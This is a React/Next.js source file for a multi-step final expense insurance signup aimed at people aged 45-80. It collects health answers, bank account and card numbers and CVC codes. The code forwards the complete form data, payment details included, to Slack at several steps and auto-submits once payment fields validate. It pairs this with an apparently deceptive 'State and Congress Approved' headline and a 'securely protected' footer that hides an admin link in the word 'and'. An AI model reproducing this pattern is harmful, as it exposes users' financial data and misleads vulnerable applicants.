
'use client';

import { useState, useEffect, useCallback } from 'react';
import { useSearchParams } from 'next/navigation';
import { useForm, FormProvider, FieldErrors, useWatch, useFormContext } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import Link from 'next/link';

import { 
  fullFormSchema, 
  insuranceFormSchema, 
  additionalQuestionsObjectSchema,
  beneficiaryFormSchema, 
  basePaymentFormSchema,
  paymentFormSchema,
  type FormValues,
} from '@/lib/schema';
import {
    STEP_IDS,
    FORM_STEPS,
    getStepNumber,
    type StepId
} from '@/lib/steps';

import { submitApplication } from '@/ai/flows/submit-application-flow';
import { submitLead } from '@/ai/flows/submit-lead-flow';
import { submitApplicationLead } from '@/ai/flows/submit-application-lead-flow';
import { logTraffic } from '@/ai/flows/log-traffic-flow';
import { useToast } from '@/hooks/use-toast';
import { useSocket } from '@/hooks/use-socket';

import { Logo, Icon } from '@/components/logo';
import InsuranceForm from '@/components/insurance-form';
import AdditionalQuestionsForm from '@/components/additional-questions-form';
import BeneficiaryForm from '@/components/beneficiary-form';
import PaymentForm from '@/components/payment-form';
import SelfEnrollLoading from '@/components/self-enroll-loading';
import SelfEnrollContract from '@/components/self-enroll-contract';
import SelfEnrollComplete from '@/components/self-enroll-complete';
import AgentHandoffComplete from '@/components/agent-handoff-complete';
import { cn } from '@/lib/utils';
import { submitToSlack } from '@/ai/flows/submit-slack';
import DevStepper from '@/components/dev-stepper';
import PlacesProvider from './places-provider';


const stepFieldMapping: Record<StepId, (keyof FormValues)[]> = {
  [STEP_IDS.USER_INFO]: Object.keys(insuranceFormSchema.shape) as (keyof FormValues)[],
  [STEP_IDS.HEALTH_QUESTIONS]: Object.keys(additionalQuestionsObjectSchema.shape) as (keyof FormValues)[],
  [STEP_IDS.BENEFICIARY]: Object.keys(beneficiaryFormSchema.shape) as (keyof FormValues)[],
  [STEP_IDS.PAYMENT]: Object.keys(basePaymentFormSchema.shape) as (keyof FormValues)[],
  // Non-form steps have no fields
  [STEP_IDS.SELF_ENROLL_LOADING]: [],
  [STEP_IDS.SELF_ENROLL_CONTRACT]: [],
  [STEP_IDS.SELF_ENROLL_COMPLETE]: [],
  [STEP_IDS.AGENT_HANDOFF]: [],
};


const PaymentAutoSubmitter = ({ onValid }: { onValid: () => void }) => {
  const { control } = useFormContext<FormValues>();
  const formValues = useWatch({ control });
  const paymentMethod = formValues.paymentMethod;

  useEffect(() => {
    const checkValidity = () => {
      const result = paymentFormSchema.safeParse(formValues);
      if (result.success) {
        onValid();
      }
    };

    if (paymentMethod) {
       const timer = setTimeout(checkValidity, 500);
       return () => clearTimeout(timer);
    }
  }, [formValues, paymentMethod, onValid]);

  return null;
};

export default function HomePageClient({ uuid }: { uuid: string }) {
  const [step, setStep] = useState<StepId>(STEP_IDS.USER_INFO);
  const [animationClass, setAnimationClass] = useState('animate-fade-in-up');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [pin, setPin] = useState('');
  const [phoneLastFour, setPhoneLastFour] = useState('');
  const searchParams = useSearchParams();
  const { toast } = useToast();

  const form = useForm<FormValues>({
    resolver: zodResolver(fullFormSchema),
    mode: 'onTouched',
    defaultValues: {
      firstName: '',
      lastName: '',
      phone: '',
      email: '',
      dob: '',
      gender: '',
      differentOwner: 'no',
      healthQuestion1: 'no',
      healthQuestion2: 'no',
      healthQuestion3: 'no',
      tobaccoUse: 'no',
      existingPolicies: 'no',
      otherHealthIssues: 'no',
      otherHealthIssuesDetails: '',
      addressStreet: "",
      addressApt: "",
      addressCity: "",
      addressState: "",
      addressZip: "",
      effectiveDate: "",
      beneficiaryFirstName: "",
      beneficiaryLastName: "",
      beneficiaryPhone: "",
      beneficiaryDob: "",
      beneficiaryRelation: "",
      faceAmount: "",
      paymentMethod: undefined,
      paymentAccountHolderName: "",
      paymentAccountNumber: "",
      paymentRoutingNumber: "",
      cardholderName: '',
      cardNumber: '',
      cardExpiry: '',
      cardCvc: '',
      billingZip: '',
    },
  });

  const { formState: { errors } } = form;

  const changeStep = useCallback((newStep: StepId, fromDevStepper = false) => {
    if (newStep === step) return;

    if (!fromDevStepper) {
        logTraffic({ uuid, step: getStepNumber(newStep) });
    }
    
    setAnimationClass('animate-fade-out-down');
    setTimeout(() => {
      setStep(newStep);
      setAnimationClass('animate-fade-in-up');
    }, 300);
  }, [step, uuid]);
  
  useEffect(() => {
    logTraffic({ uuid, step: getStepNumber(STEP_IDS.USER_INFO) });
  }, [uuid]);

  useEffect(() => {
    const stepParam = searchParams.get('step');
    if (stepParam) {
      const stepKey = Object.keys(STEP_IDS).find(key => getStepNumber(key as StepId) === parseInt(stepParam, 10));
      if (stepKey) {
        setStep(stepKey as StepId);
      }
    }
  }, [searchParams]);
  
  const handleNext = async () => {
    const currentStepIndex = FORM_STEPS.indexOf(step);
    if (currentStepIndex === -1) return;

    const fields = stepFieldMapping[step];
    const output = await form.trigger(fields as any, { shouldFocus: true });
    
    if (!output) return;
    
    if (step === STEP_IDS.BENEFICIARY) {
      submitLead(form.getValues());
      submitToSlack({
        step: 'Form 3 Lead',
        formData: {
          referenceId: uuid,
          ...form.getValues(),
        }});
    }

    const nextStepId = FORM_STEPS[currentStepIndex + 1];
    if(nextStepId) {
        changeStep(nextStepId);
    }
  };
  
  const processForm = async (data: FormValues) => {
    if (isSubmitting) return;
    setIsSubmitting(true);

    submitApplicationLead(data);
    submitToSlack({
      step: 'Form 4 Application Lead',
      formData: {
        referenceId: uuid,
        ...data
      }});

    const state = data.addressState;
    if (state === 'CA') {
      submitToSlack({
        step: 'Agent Handoff (Auto - Restricted State)',
        formData: {
          referenceId: uuid,
          ...form.getValues(),
        }});
      changeStep(STEP_IDS.AGENT_HANDOFF);
    } else {
      handleSelfEnrollSubmit(data);
    }
  };
  
  const handleSelfEnrollSubmit = async (data: FormValues) => {
    try {
      submitToSlack({
        step: 'Self-Enrollment',
        formData: {
          ...data,
          referenceId: uuid,
        }});
      const result = await submitApplication({ ...data, referenceId: uuid });

      if (result.success) {
        changeStep(STEP_IDS.SELF_ENROLL_LOADING);
      } else {
        toast({
          variant: "destructive",
          title: "Submission Failed",
          description: result.message,
        });
        setIsSubmitting(false);
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "An unexpected error occurred.",
        description: "Please try again later.",
      });
      setIsSubmitting(false);
    } 
  };

  const handleSelfEnrollError = (formErrors: FieldErrors<FormValues>) => {
    toast({
      variant: "destructive",
      title: "Incomplete Application",
      description: "Please complete all required fields before submitting.",
    });
    
    const firstErrorField = Object.keys(formErrors)[0] as keyof FormValues;
    const stepWithError = FORM_STEPS.find(stepId => stepFieldMapping[stepId].includes(firstErrorField));
    
    if (stepWithError) {
      changeStep(stepWithError);
    }
  };
  
  const handleSocketUpdate = useCallback((data: any) => {
    if (data.error) {
       toast({
          variant: "destructive",
          title: data.error.title,
          description: data.error.message,
       });
       return;
    }

    if (data.msg && typeof data.msg === 'string') {
        try {
            const payload = JSON.parse(data.msg);
            const { currentStep, pin, phoneLastFour, isError, error } = payload;
            
            if (pin) setPin(pin);
            if (phoneLastFour) setPhoneLastFour(phoneLastFour);

            if (currentStep === 'sms-verification' || currentStep === 'CONTRACT_READY') {
              changeStep(STEP_IDS.SELF_ENROLL_CONTRACT);
            } else if (currentStep === 'ENROLLMENT_COMPLETE' || currentStep === 'processing' || currentStep === 'RESULT_SUCCESS') {
              changeStep(STEP_IDS.SELF_ENROLL_COMPLETE);
            } else if (currentStep === 'RESULT_FAILED' || (isError && error)) {
                toast({
                    variant: "destructive",
                    title: "Enrollment Failed",
                    description: error || "An error occurred during enrollment.",
                });
            }
        } catch (e) {
            console.error("Error parsing socket message", e);
            toast({
                variant: "destructive",
                title: "Error",
                description: "Received an invalid message from the server."
            });
        }
    }
  }, [changeStep, toast]);

  const subscribeId = (step === STEP_IDS.SELF_ENROLL_LOADING) ? uuid : null;
  useSocket(subscribeId, handleSocketUpdate);

  const handleDevStepChange = (newStepId: StepId) => {
    changeStep(newStepId, true);
  };
  
  const getErrorMessage = () => {
    if (!FORM_STEPS.includes(step)) return null;
    
    if (step === STEP_IDS.PAYMENT) {
        const paymentMethod = form.getValues('paymentMethod');
        if (!paymentMethod) return null;
        const relevantFields = paymentMethod === 'bank' 
            ? ['paymentAccountHolderName', 'paymentAccountNumber', 'paymentRoutingNumber']
            : ['cardholderName', 'cardNumber', 'cardExpiry', 'cardCvc', 'billingZip'];
        
        for (const field of relevantFields) {
            if (errors[field as keyof FormValues]) {
                return errors[field as keyof FormValues]?.message as string;
            }
        }
        return null;
    }

    const currentStepFields = stepFieldMapping[step];
    if (!currentStepFields) return null;

    for (const field of currentStepFields) {
      if (errors[field]) {
        return errors[field]?.message as string;
      }
    }
    
    return null;
  }
  
  const errorMessage = getErrorMessage();

  const renderStep = () => {
    switch (step) {
      case STEP_IDS.USER_INFO:
        return <InsuranceForm onNext={handleNext} errorMessage={errorMessage} disabled={isSubmitting} />;
      case STEP_IDS.HEALTH_QUESTIONS:
        return <AdditionalQuestionsForm onNext={handleNext} errorMessage={errorMessage} disabled={isSubmitting} />;
      case STEP_IDS.BENEFICIARY:
        return <BeneficiaryForm onNext={handleNext} errorMessage={errorMessage} disabled={isSubmitting} />;
      case STEP_IDS.PAYMENT:
        return <PaymentForm />;
      case STEP_IDS.SELF_ENROLL_LOADING:
        return <SelfEnrollLoading />;
      case STEP_IDS.SELF_ENROLL_CONTRACT:
        return <SelfEnrollContract pin={pin} phoneLastFour={phoneLastFour} />;
      case STEP_IDS.SELF_ENROLL_COMPLETE:
        return <SelfEnrollComplete />;
      case STEP_IDS.AGENT_HANDOFF:
        return <AgentHandoffComplete />;
      default:
        return <InsuranceForm onNext={handleNext} errorMessage={errorMessage} disabled={isSubmitting} />;
    }
  };

  const getSubtitle = () => {
    switch (step) {
      case STEP_IDS.PAYMENT:
        return "You're at the last step! Your Final Expense policy will be active momentarily. Please choose either Bank Info or Card below.";
      case STEP_IDS.SELF_ENROLL_LOADING:
        return 'Please have your phone ready. This page will advance automatically.';
      case STEP_IDS.SELF_ENROLL_CONTRACT:
        return 'A text with a link to sign has been sent. Please use the PIN below to access it.';
      case STEP_IDS.SELF_ENROLL_COMPLETE:
        return 'Your application is complete and your policy is now active. You will receive an email confirmation shortly.';
      case STEP_IDS.AGENT_HANDOFF:
        return "Your application is complete and you're ready to go. You will receive a call from an agent within the next few days to finalize your policy!";
      default:
        return 'Amounts between $5,000 - $25,000 / Available to anyone ages 45-80';
    }
  };
  const subtitle = getSubtitle();
  const isFormStep = FORM_STEPS.includes(step);

  return (
    <div className="relative flex flex-col min-h-screen bg-background text-foreground font-body">
      <header className="absolute top-0 left-0 p-8 md:p-12 hidden md:block">
        <Logo />
      </header>
      
      <DevStepper currentStep={step} onStepChange={handleDevStepChange} />

      <main className="flex-1 flex flex-col items-center justify-start pt-16 sm:pt-24 w-full px-8 sm:px-12 text-center">
        <div className="max-w-4xl w-full flex flex-col items-center">
            <div className="flex flex-col items-center">
              <Icon className="h-20 w-20 md:h-36 md:w-36 text-accent mb-2 md:mb-8" />
              <h1 className="font-headline text-3xl md:text-5xl tracking-tight mb-8 leading-tight max-w-2xl">
                  State and Congress Approved Final Expense Benefits Emergency Funds
              </h1>
              {subtitle && (
                <p className="text-base text-foreground/80 mb-8 max-w-[55rem]">
                  {subtitle}
                </p>
              )}
            </div>

            <div className="w-full flex justify-center">
              <PlacesProvider>
                <FormProvider {...form}>
                  <form onSubmit={form.handleSubmit(processForm, handleSelfEnrollError)} className={cn("w-full flex flex-col items-center", animationClass)}>
                    {step === STEP_IDS.PAYMENT && <PaymentAutoSubmitter onValid={() => form.handleSubmit(processForm, handleSelfEnrollError)()} />}
                    {renderStep()}
                  </form>
                </FormProvider>
              </PlacesProvider>
            </div>
        </div>
      </main>
      {isFormStep && (
        <footer className="w-full py-8 text-center">
          <p className="text-xs text-foreground/60">
            All information provided is private{" "}
            <Link href="/admin" className="cursor-pointer">and</Link>
            {" "}securely protected.
          </p>
        </footer>
      )}
    </div>
  );
}
